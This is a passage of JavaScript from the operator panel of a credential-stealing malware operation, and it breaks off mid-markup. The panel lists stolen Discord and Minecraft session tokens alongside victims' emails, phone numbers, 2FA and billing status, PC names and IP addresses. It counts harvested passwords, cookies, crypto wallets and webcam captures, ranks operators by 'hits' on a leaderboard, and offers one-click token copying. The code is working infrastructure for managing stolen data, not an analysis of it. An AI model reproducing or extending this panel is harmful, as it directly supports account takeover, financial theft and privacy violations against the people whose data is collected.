            const res = await api(`/api/logs/search?q=${encodeURIComponent(query)}&type=${currentLogTypeFilter}`);

            if (res.success) {
                allLogs = res.logs;
                renderLogs(res.logs, 'logsGrid');
                toast(`Found ${res.count} results`, 'success');
            } else {
                toast(res.error || 'Search failed', 'error');
            }
        }

        function clearLogsSearch() {
            logsSearchQuery = '';
            document.getElementById('logsSearchInput').value = '';
            loadLogs();
        }

        // Login Logs Delete Functions
        function showClearLoginLogsModal() {
            document.getElementById('modalTitle').textContent = 'Clear Login Logs';
            document.getElementById('modalBody').innerHTML = `
                <p style="color: var(--text-secondary); margin-bottom: 20px;">Select what to clear:</p>
                
                <div style="display: flex; flex-direction: column; gap: 12px;">
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('all'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-trash"></i> Clear ALL Login Logs
                    </button>
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('failed'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-times"></i> Clear Failed Logins Only
                    </button>
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('successful'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-check"></i> Clear Successful Logins Only
                    </button>
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('old'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-clock"></i> Clear Logs Older Than 30 Days
                    </button>
                </div>
                
                <div style="margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--border);">
                    <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 10px;">Clear by specific IP:</p>
                    <div style="display: flex; gap: 8px;">
                        <input type="text" id="clearByIpInput" placeholder="Enter IP address..." 
                               style="flex: 1; padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary);">
                        <button class="btn btn-secondary" onclick="clearLoginLogsByIp()">Clear</button>
                    </div>
                </div>
            `;
            document.getElementById('modal').classList.add('active');
        }

        async function clearLoginLogsByType(type) {
            const res = await api('/api/admin/login-logs/clear', 'POST', { type: type, days: 30 });

            if (res.success) {
                toast(`Cleared ${res.deleted} login logs`, 'success');
                loadLoginLogs();
            } else {
                toast('Failed to clear logs', 'error');
            }
        }

        async function clearLoginLogsByIp() {
            const ip = document.getElementById('clearByIpInput').value.trim();
            if (!ip) {
                toast('Please enter an IP address', 'error');
                return;
            }

            const res = await api('/api/admin/login-logs/clear', 'POST', { type: 'ip', ip: ip });

            if (res.success) {
                toast(`Cleared ${res.deleted} logs for IP ${ip}`, 'success');
                closeModal();
                loadLoginLogs();
            } else {
                toast('Failed to clear logs', 'error');
            }
        }

        function showTokenDetail(idx) {
            const token = allDiscordTokens[idx];
            if (!token) return;

            window.currentLogToken = token.token;

            const statusBadge = token.valid === true ?
                '<span style="background: var(--success); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-check"></i> Valid</span>' :
                token.valid === false ?
                    '<span style="background: var(--danger); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-times"></i> Invalid</span>' :
                    '<span style="background: var(--text-muted); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-question"></i> Unknown</span>';

            const sourceBadge = token.source === 'zip' ?
                '<span style="background: var(--success); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-file-archive"></i> From ZIP</span>' :
                '<span style="background: var(--discord-blue); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-bolt"></i> Direct</span>';

            // Nitro badge - check both has_nitro and nitro_type
            const hasNitro = token.has_nitro || (token.nitro_type && token.nitro_type !== 'No Nitro' && token.nitro_type !== '');
            const nitroLabel = token.nitro_type || (hasNitro ? 'Nitro' : '');
            const nitroBadge = hasNitro ?
                `<span style="background: linear-gradient(90deg, #f47fff, #a855f7); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-crown"></i> ${nitroLabel}</span>` : '';

            // MFA badge
            const mfaBadge = token.mfa_enabled ?
                '<span style="background: var(--accent); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-lock"></i> 2FA</span>' : '';

            // Avatar URL
            let avatarUrl = 'https://cdn.discordapp.com/embed/avatars/0.png';
            if (token.user_id && token.avatar) {
                avatarUrl = `https://cdn.discordapp.com/avatars/${token.user_id}/${token.avatar}.png?size=128`;
            }

            // Banner
            let bannerHtml = '';
            if (token.user_id && token.banner) {
                bannerHtml = `<div style="background: url('https://cdn.discordapp.com/banners/${token.user_id}/${token.banner}.png?size=600') center/cover; height: 100px; border-radius: 8px; margin-bottom: 16px;"></div>`;
            }

            let content = `
                ${bannerHtml}
                <div style="display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap;">
                    ${statusBadge}
                    ${sourceBadge}
                    ${nitroBadge}
                    ${mfaBadge}
                </div>
                
                <!-- User Profile Header -->
                <div style="display: flex; align-items: center; background: var(--bg-secondary); padding: 20px; border-radius: 12px; margin-bottom: 16px;">
                    <img src="${avatarUrl}" style="width: 80px; height: 80px; border-radius: 50%; margin-right: 20px; border: 3px solid ${hasNitro ? '#a855f7' : 'var(--discord-blue)'};" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                    <div>
                        <div style="font-size: 22px; font-weight: 700; margin-bottom: 4px;">${token.username || 'Unknown'}</div>
                        ${token.user_id ? `<div style="color: var(--text-muted); font-size: 12px;">ID: ${token.user_id}</div>` : ''}
                        ${token.email ? `<div style="color: var(--text-secondary); font-size: 13px; margin-top: 6px;"><i class="fas fa-envelope" style="width: 16px;"></i> ${token.email}</div>` : ''}
                        ${token.phone ? `<div style="color: var(--text-secondary); font-size: 13px; margin-top: 2px;"><i class="fas fa-phone" style="width: 16px;"></i> ${token.phone}</div>` : ''}
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px;">
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                        <div style="font-weight: 600; margin-bottom: 12px; color: var(--discord-blue);">
                            <i class="fab fa-discord"></i> Account Info
                        </div>
                        <div style="font-size: 13px; line-height: 1.8;">
                            <div><strong>2FA:</strong> ${token.mfa_enabled ? ' Enabled' : ' Disabled'}</div>
                            <div><strong>Verified:</strong> ${token.verified ? ' Yes' : ' No'}</div>
                            <div><strong>Billing:</strong> ${token.has_billing ? ' Yes' : ' No'}</div>
                            <div><strong>Guilds:</strong> ${token.guild_count || 0}</div>
                            <div><strong>Friends:</strong> ${token.friends_count || 0}</div>
                        </div>
                    </div>
                    
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                        <div style="font-weight: 600; margin-bottom: 12px; color: var(--accent);">
                            <i class="fas fa-laptop"></i> Victim Info
                        </div>
                        <div style="font-size: 13px; line-height: 1.8;">
                            <div><strong>PC:</strong> ${token.pc_name}</div>
                            <div><strong>User:</strong> ${token.pc_user}</div>
                            <div><strong>IP:</strong> ${token.ip}</div>
                            <div><strong>Country:</strong> ${token.country}</div>
                            <div><strong>Date:</strong> ${new Date(token.created_at).toLocaleString()}</div>
                        </div>
                    </div>
                </div>
            `;

            if (token.badges && token.badges.length > 0) {
                content += `
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-weight: 600; margin-bottom: 12px; color: var(--success);">
                            <i class="fas fa-medal"></i> Badges (${token.badges.length})
                        </div>
                        <div style="display: flex; flex-wrap: wrap; gap: 6px;">
                            ${token.badges.map(badge => `
                                <span style="background: var(--accent); color: white; padding: 4px 8px; border-radius: 12px; font-size: 11px;">
                                    ${badge}
                                </span>
                            `).join('')}
                        </div>
                    </div>
                `;
            }

            if (token.source === 'zip' && token.source_file) {
                content += `
                    <div style="background: var(--bg-secondary); padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 13px;">
                        <i class="fas fa-file-archive" style="color: var(--success);"></i>
                        <strong>Source File:</strong> ${token.source_file}
                    </div>
                `;
            }

            content += `
                <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">DISCORD TOKEN</div>
                    <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue); background: var(--bg-primary); padding: 12px; border-radius: 6px; max-height: 120px; overflow-y: auto;">
                        ${token.token}
                    </div>
                </div>
                
                <div style="display: flex; gap: 8px;">
                    <button class="btn btn-primary" style="flex: 1;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy Token
                    </button>
                    <button class="btn btn-secondary" style="flex: 1;" onclick="validateToken(${idx}); closeModal();">
                        <i class="fas fa-check"></i> Validate
                    </button>
                </div>
            `;

            document.getElementById('modalTitle').textContent = `Discord Token: ${token.username || 'Unknown'}`;
            document.getElementById('modalBody').innerHTML = content;
            document.getElementById('modal').classList.add('active');
        }

        // Dashboard
        async function loadDashboard() {
            const res = await api('/api/dashboard');
            const s = res.stats || {};

            document.getElementById('statsGrid').innerHTML = `
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon green"><i class="fas fa-bolt"></i></div>
                    </div>
                    <div class="stat-card-value">${s.hits_today || 0}</div>
                    <div class="stat-card-label">Hits Today</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon mc"><i class="fas fa-cube"></i></div>
                    </div>
                    <div class="stat-card-value">${s.mc_sessions || 0}</div>
                    <div class="stat-card-label">MC Sessions</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon blue"><i class="fab fa-discord"></i></div>
                    </div>
                    <div class="stat-card-value">${s.tokens || 0}</div>
                    <div class="stat-card-label">Discord Tokens</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon yellow"><i class="fas fa-key"></i></div>
                    </div>
                    <div class="stat-card-value">${s.passwords || 0}</div>
                    <div class="stat-card-label">Passwords</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon red"><i class="fas fa-wallet"></i></div>
                    </div>
                    <div class="stat-card-value">${s.wallets || 0}</div>
                    <div class="stat-card-label">Total Wallets</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon green"><i class="fas fa-file-archive"></i></div>
                    </div>
                    <div class="stat-card-value">${s.zips || 0}</div>
                    <div class="stat-card-label">Total ZIPs</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon purple"><i class="fas fa-users"></i></div>
                    </div>
                    <div class="stat-card-value">${s.victims || 0}</div>
                    <div class="stat-card-label">Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon orange"><i class="fas fa-camera"></i></div>
                    </div>
                    <div class="stat-card-value">${s.webcam || 0}</div>
                    <div class="stat-card-label">Total Webcam</div>
                </div>
            `;

            allLogs = res.logs || [];
            renderLogs(allLogs, 'recentLogs');
            // Leaderboard moved to dedicated tab, load on demand or initial?
            // loadLeaderboard(); // Removed from main dashboard load
        }

        // Leaderboard Load Wrapper
        function openLeaderboard() {
            loadLeaderboard();
        }

        async function loadLeaderboard() {
            const res = await api('/api/dashboard/leaderboard');
            const tbody = document.getElementById('leaderboardTable');

            // Populate name input if not set (optional, or fetch current user settings)
            if (currentUser && currentUser.leaderboard_name) {
                const input = document.getElementById('leaderboardNameInputTab');
                if (input && !input.value) input.value = currentUser.leaderboard_name;
            }

            // Admin Logic removed - Admins are treated as normal users
            document.getElementById('adminLeaderboardMessage').style.display = 'none';
            document.getElementById('leaderboardTableContainer').style.display = 'block';
            document.getElementById('leaderboardSettingsPanel').style.display = 'flex';

            if (res.success && res.leaderboard) {
                if (res.leaderboard.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="3" style="padding: 20px; text-align: center; color: var(--text-muted);">No data yet</td></tr>';
                    return;
                }

                tbody.innerHTML = res.leaderboard.map(u => `
                    <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                        <td style="padding: 12px 20px;">
                            ${u.rank === 1 ? '<i class="fas fa-crown" style="color: gold;"></i>' :
                        u.rank === 2 ? '<i class="fas fa-crown" style="color: silver;"></i>' :
                            u.rank === 3 ? '<i class="fas fa-crown" style="color: #cd7f32;"></i>' :
                                '<span style="color: var(--text-muted); font-weight: bold;">#' + u.rank + '</span>'}
                        </td>
                        <td style="padding: 12px 20px;">
                            <div style="font-weight: bold; color: white;">${escapeHtml(u.name)}</div>
                        </td>
                        <td style="padding: 12px 20px;">
                            <span style="font-family: monospace; color: var(--accent);">${u.hits}</span>
                        </td>
                    </tr>
                `).join('');
            }
        }

        async function updateLeaderboardNameTab() {
            const name = document.getElementById('leaderboardNameInputTab').value;
            if (!name) return toast('Please enter a name', 'error');

            const res = await api('/api/v1/settings/leaderboard/name', 'POST', { name });
            if (res.success) {
                toast('Leaderboard name updated', 'success');
                // Update local user
                currentUser.leaderboard_name = name;
                loadLeaderboard(); // Refresh
            } else {
                toast(res.error || 'Failed to update name', 'error');
            }
        }

        function filterLogs(type) {
            currentLogTypeFilter = type;  // Track current filter for search

            // Manage active button classes inside the logs filter bar only
            document.querySelectorAll('#page-logs .filter-btn').forEach(b => b.classList.remove('active'));
            try { event.target.classList.add('active'); } catch (_) { }

            if (type === 'all') {
                // Load first page
                loadLogs('all', 1000, true);
                return;
            }

            // For specific types (e.g. 'minecraft') request server-side filtered logs
            loadLogs(type, 1000, true);
        }

        function renderLogs(logs, containerId) {
            const container = document.getElementById(containerId);
            if (!logs.length) {
                container.innerHTML = '<p style="color: var(--text-muted); padding: 20px;">No logs yet</p>';
                return;
            }

            container.innerHTML = logs.map(log => {
                const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
                const preview = getPreview(log.log_type, data);
                const icon = getTypeIcon(log.log_type);
                const time = new Date(log.created_at).toLocaleString();

                return `
                <div class="log-card">
                    <div class="log-card-header">
                        <div class="log-card-type">
                            <span class="log-type-badge ${log.log_type}">${icon} ${log.log_type}</span>
                        </div>
                        <div class="log-card-actions">
                            <button class="btn btn-secondary btn-icon" onclick="downloadLog(${log.id})" title="Download">
                                <i class="fas fa-download"></i>
                            </button>
                            <button class="btn btn-secondary btn-icon" onclick="deleteLog(${log.id})" title="Delete">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                    <div class="log-card-body">
                        <div class="log-info-row">
                            <i class="fas fa-desktop"></i>
                            <span>${log.pc_name || 'Unknown'}</span>
                        </div>
                        <div class="log-info-row">
                            <i class="fas fa-user"></i>
                            <span>${log.pc_user || 'Unknown'}</span>
                        </div>
                        <div class="log-info-row">
                            <i class="fas fa-globe"></i>
                            <span>${log.ip || 'Unknown'} (${log.country || 'Unknown'})</span>
                        </div>
                        ${preview}
                    </div>
                    <div class="log-card-footer">
                        <span>${time}</span>
                        <button class="btn btn-secondary btn-sm" onclick="showLogDetail(${log.id})">View Details</button>
                    </div>
                </div>
                `;
            }).join('');
        }

        function getTypeIcon(type) {
            const icons = {
                minecraft: '<i class="fas fa-cube"></i>',
                discord: '<i class="fab fa-discord"></i>',
                browser: '<i class="fas fa-globe"></i>',
                wallet: '<i class="fas fa-wallet"></i>',
                system: '<i class="fas fa-laptop"></i>',
                zip: '<i class="fas fa-file-archive"></i>'
            };
            return icons[type] || '<i class="fas fa-file"></i>';
        }

        function getPreview(type, data) {
            if (!data) return '';

            if (type === 'zip_upload' || type === 'zip') {
                const filename = data.filename || 'unknown.zip';
                return `
                <div class="log-preview">
                    <div class="log-preview-title"><i class="fas fa-file-archive" style="color: var(--warning);"></i> Uploaded Archive</div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${filename}</div>
                    </div>
                </div>`;
            }

            if (type === 'browser') {
                const count = (data.passwords?.length || 0) + (data.cookies?.length || 0);
                const browser = data.browser || 'Unknown';
                return `
                <div class="log-preview">
                     <div class="log-preview-title"><i class="fas fa-globe" style="color: var(--accent);"></i> ${browser}</div>
                     <div class="log-preview-content">${count} items extracted</div>
                </div>`;
            }

            if (type === 'wallet') {
                return `
                <div class="log-preview">
                     <div class="log-preview-title"><i class="fas fa-wallet" style="color: var(--success);"></i> Wallet</div>
                     <div class="log-preview-content">${data.app || 'Unknown App'}</div>
                </div>`;
            }

            if (type === 'minecraft') {
                const token = data.access_token || '';
                const preview = token.substring(0, 50) + (token.length > 50 ? '...' : '');
                const tokenId = 'mc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                return `
                <div class="log-preview">
                    <div class="log-preview-title">Player: ${data.player || 'Unknown'}</div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${preview || 'No token'}</div>
                        <button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button>
                    </div>
                </div>`;
            }

            if (type === 'discord') {
                const token = data.token || '';
                const preview = token.substring(0, 35) + (token.length > 35 ? '...' : '');
                const tokenId = 'dc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;

                const isEnhanced = data.enhanced || false;
                let userInfo = data.username || 'Unknown';
                let additionalInfo = '';

                if (isEnhanced) {
                    const nitroStatus = data.nitro_type && data.nitro_type !== 'No Nitro' ? '' : '';
                    const billingStatus = data.has_billing ? '' : '';
                    const mfaStatus = data.mfa_enabled ? '' : '';
                    const badgeCount = data.badges ? data.badges.length : 0;
                    const guildCount = data.guild_count || 0;

                    additionalInfo = `
                        <div style="display: flex; gap: 8px; margin-top: 6px; font-size: 11px;">
                            ${nitroStatus ? `<span style="color: var(--warning);" title="Nitro: ${data.nitro_type}">${nitroStatus}</span>` : ''}
                            ${billingStatus ? `<span style="color: var(--success);" title="Has Billing">${billingStatus}</span>` : ''}
                            ${mfaStatus ? `<span style="color: var(--accent);" title="2FA Enabled">${mfaStatus}</span>` : ''}
                            ${badgeCount > 0 ? `<span style="color: var(--danger);" title="${badgeCount} Badges">${badgeCount}</span>` : ''}
                            ${guildCount > 0 ? `<span style="color: var(--text-secondary);" title="${guildCount} Guilds">${guildCount}</span>` : ''}
                        </div>
                    `;
                }

                return `
                <div class="log-preview">
                    <div class="log-preview-title" style="position: relative;">
                        ${userInfo}
                        ${isEnhanced ? '<span style="position: absolute; top: -2px; right: 0; background: var(--success); color: white; font-size: 8px; padding: 1px 4px; border-radius: 8px;">ENHANCED</span>' : ''}
                        ${data.email ? '<div style="font-size: 11px; color: var(--text-muted); margin-top: 2px;">' + data.email + '</div>' : ''}
                        ${additionalInfo}
                    </div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${preview || 'No token'}</div>
                        <button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button>
                    </div>
                </div>`;
            }

            if (type === 'zip') {
                const size = data.size ? (data.size / 1024 / 1024).toFixed(2) + ' MB' : 'Unknown size';
                return `
                <div class="log-preview">
                    <div class="log-preview-title"><i class="fas fa-file-archive" style="color: var(--success);"></i> Data Package</div>
                    <div class="log-preview-content">
                        Size: <span style="color: var(--success)">${size}</span><br>
                        Contains: Browser data, Wallets, Discord, Telegram, Gaming
                    </div>
                </div>`;
            }

            if (type === 'browser') {
                // Handle both array format and single credential format
                let pw = data.passwords?.length || data.data?.passwords?.length || 0;
                let ck = data.cookies?.length || data.data?.cookies?.length || 0;
                // If password is at root level (single credential), count as 1
                if (pw === 0 && data.password && data.password.trim() !== '') pw = 1;
                if (pw === 0 && data.username && data.url) pw = 1; // Count as credential even if pw empty
                return `
                <div class="log-preview">
                    <div class="log-preview-title">Browser Data - ${escapeHtml(data.browser || 'Unknown')}</div>
                    <div class="log-preview-content">
                        <span style="color: var(--warning)">${pw} credential${pw !== 1 ? 's' : ''}</span>  
                        <span style="color: var(--success)">${ck} cookies</span>
                    </div>
                </div>`;
            }

            if (type === 'wallet') {
                return `
                <div class="log-preview">
                    <div class="log-preview-title">${data.wallet_name || 'Wallet'}</div>
                    <div class="log-preview-content">${data.wallet_type || 'Unknown type'}</div>
                </div>`;
            }

            return '';
        }

        function copyToken(tokenId, btn) {
            const text = window[tokenId] || '';
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(() => {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        function copyText(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        // Wrapper for inline onclick - uses the log object directly instead of fetching
        function openLogDetail(log) {
            showLogDetailFromData(log);
        }

        // Show log detail from already loaded data (no API call needed)
        function showLogDetailFromData(log) {
            const data = typeof log.data === 'string' ? JSON.parse(log.data) : (log.data || {});

            // Store token globally for copy
            window.currentLogToken = null;

            let content = '';

            if (log.log_type === 'minecraft') {
                // MC: Show only token with big copy button
                const token = data.access_token || '';
                window.currentLogToken = token;
                document.getElementById('modalTitle').textContent = `MC Session: ${data.player || 'Unknown'}`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-user"></i> ${log.pc_user || 'Unknown'} @ ${log.pc_name || 'Unknown'}<br>
                        <i class="fas fa-globe"></i> ${log.ip || log.ip_address || 'Unknown'} (${log.country || 'Unknown'})<br>
                        <i class="fas fa-gamepad"></i> UUID: ${data.uuid || 'Unknown'}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">ACCESS TOKEN</div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--mc-green); max-height: 200px; overflow: auto;">${token || 'No token available'}</div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy MC Token
                    </button>
                `;
            } else if (log.log_type === 'discord') {
                // Discord display
                const token = data.token || '';
                const isEnhanced = data.enhanced || false;
                window.currentLogToken = token;

                let avatarUrl = 'https://cdn.discordapp.com/embed/avatars/0.png';
                if (isEnhanced && data.avatar) {
                    avatarUrl = `https://cdn.discordapp.com/avatars/${data.user_id}/${data.avatar}.png?size=256`;
                }

                document.getElementById('modalTitle').textContent = `Discord: ${data.username || 'Unknown'}`;

                content = `
                    <div style="display: flex; align-items: center; margin-bottom: 20px; padding: 16px; background: var(--bg-secondary); border-radius: 12px;">
                        <img src="${avatarUrl}" style="width: 64px; height: 64px; border-radius: 50%; margin-right: 16px; border: 3px solid var(--discord-blue);">
                        <div>
                            <div style="font-size: 18px; font-weight: 600; margin-bottom: 4px;">${data.username || 'Unknown'}</div>
                            <div style="color: var(--text-secondary); font-size: 14px;">
                                <i class="fas fa-id-badge"></i> ${data.user_id || 'Unknown ID'}
                            </div>
                        </div>
                    </div>
                    <div style="background: var(--bg-secondary); padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 13px; color: var(--text-muted);">
                        <i class="fas fa-desktop"></i> ${log.pc_user || 'Unknown'} @ ${log.pc_name || 'Unknown'}  
                        <i class="fas fa-globe"></i> ${log.ip || log.ip_address || 'Unknown'} (${log.country || 'Unknown'})
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">DISCORD TOKEN</div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue); max-height: 120px; overflow: auto;">${token || 'No token'}</div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy Discord Token
                    </button>
                `;
            } else if (log.log_type === 'zip_upload') {
                // ZIP: Show download button
                let size = 'Unknown size';
                if (data.size) {
                    size = data.size > 1024 * 1024 ? (data.size / (1024 * 1024)).toFixed(2) + ' MB' : (data.size / 1024).toFixed(2) + ' KB';
                }
                document.getElementById('modalTitle').textContent = data.filename || 'ZIP Data';
                content = `
                    <div style="text-align: center; padding: 24px 0;">
                        <div style="font-size: 48px; margin-bottom: 16px;"></div>
                        <div style="font-size: 24px; font-weight: 700; color: var(--success); margin-bottom: 8px;">${size}</div>
                        <div style="font-size: 12px; color: var(--text-muted);">
                            Contains: Browser Data, Cookies, Passwords, Discord Tokens, Wallets, Telegram, Gaming Data
                        </div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="downloadLog(${log.id})">
                        <i class="fas fa-download"></i> Download ZIP
                    </button>
                `;
            } else {
                // Other types: Show full JSON
                document.getElementById('modalTitle').textContent = `${(log.log_type || 'Unknown').toUpperCase()} Log`;
                content = `
                    <div style="margin-bottom: 16px;">
                        <strong>PC:</strong> ${log.pc_name || 'Unknown'}<br>
                        <strong>User:</strong> ${log.pc_user || 'Unknown'}<br>
                        <strong>IP:</strong> ${log.ip || log.ip_address || 'Unknown'} (${log.country || 'Unknown'})<br>
                        <strong>Time:</strong> ${new Date(log.created_at).toLocaleString()}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; max-height: 400px; overflow: auto;">
                        <pre style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all;">${JSON.stringify(data, null, 2)}</pre>
                    </div>
                    <div style="margin-top: 16px;">
                        <button class="btn btn-primary" onclick="downloadLog(${log.id})">
                            <i class="fas fa-download"></i> Download
                        </button>
                    </div>
                `;
            }

            document.getElementById('modalBody').innerHTML = content;
            document.getElementById('modal').classList.add('active');
        }

        async function showLogDetail(id) {
            const res = await api(`/api/logs/${id}`);
            if (!res.success) return;

            const log = res.log;
            const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;

            // Store token globally for copy
            window.currentLogToken = null;

            let content = '';

            if (log.log_type === 'minecraft') {
                // MC: Show only token with big copy button
                const token = data.access_token || '';
                window.currentLogToken = token;
                document.getElementById('modalTitle').textContent = `MC Session: ${data.player || 'Unknown'}`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}<br>
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country})<br>
                        <i class="fas fa-gamepad"></i> UUID: ${data.uuid || 'Unknown'}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">ACCESS TOKEN</div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--mc-green); max-height: 200px; overflow: auto;">${token || 'No token available'}</div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy MC Token
                    </button>
                `;
            } else if (log.log_type === 'discord') {
                // Enhanced Discord: Show comprehensive user information
                const token = data.token || '';
                const isEnhanced = data.enhanced || false;
                window.currentLogToken = token;

                let avatarUrl = 'https://cdn.discordapp.com/embed/avatars/0.png';
                let bannerStyle = '';

                if (isEnhanced && data.avatar) {
                    avatarUrl = `https://cdn.discordapp.com/avatars/${data.user_id}/${data.avatar}.png?size=256`;
                }

                if (isEnhanced && data.banner) {
                    bannerStyle = `background: url('https://cdn.discordapp.com/banners/${data.user_id}/${data.banner}.png?size=1024') center/cover; min-height: 120px; border-radius: 8px; margin-bottom: 16px;`;
                }

                document.getElementById('modalTitle').textContent = `Discord: ${data.username || 'Unknown'}`;

                let content = '';

                // Banner if available
                if (isEnhanced && data.banner) {
                    content += `<div style="${bannerStyle}"></div>`;
                }

                // User avatar and basic info
                content += `
                    <div style="display: flex; align-items: center; margin-bottom: 20px; padding: 16px; background: var(--bg-secondary); border-radius: 12px;">
                        <img src="${avatarUrl}" style="width: 64px; height: 64px; border-radius: 50%; margin-right: 16px; border: 3px solid var(--discord-blue);">
                        <div>
                            <div style="font-size: 18px; font-weight: 600; margin-bottom: 4px;">${data.username || 'Unknown'}</div>
                            <div style="color: var(--text-secondary); font-size: 14px;">
                                <i class="fas fa-id-badge"></i> ${data.user_id || 'Unknown ID'}
                            </div>
                        </div>
                    </div>
                `;

                if (isEnhanced) {
                    // Enhanced information sections
                    content += `
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--accent);">
                                    <i class="fas fa-user-circle"></i> Account Info
                                </div>
                                <div style="font-size: 13px; line-height: 1.5;">
                                    <div><strong>Email:</strong> ${data.email || 'No email'}</div>
                                    <div><strong>Phone:</strong> ${data.phone || 'No phone'}</div>
                                    <div><strong>Locale:</strong> ${data.locale || 'Unknown'}</div>
                                    <div><strong>2FA:</strong> ${data.mfa_enabled ? ' Enabled' : ' Disabled'}</div>
                                </div>
                            </div>
                            
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--warning);">
                                    <i class="fas fa-crown"></i> Premium & Billing
                                </div>
                                <div style="font-size: 13px; line-height: 1.5;">
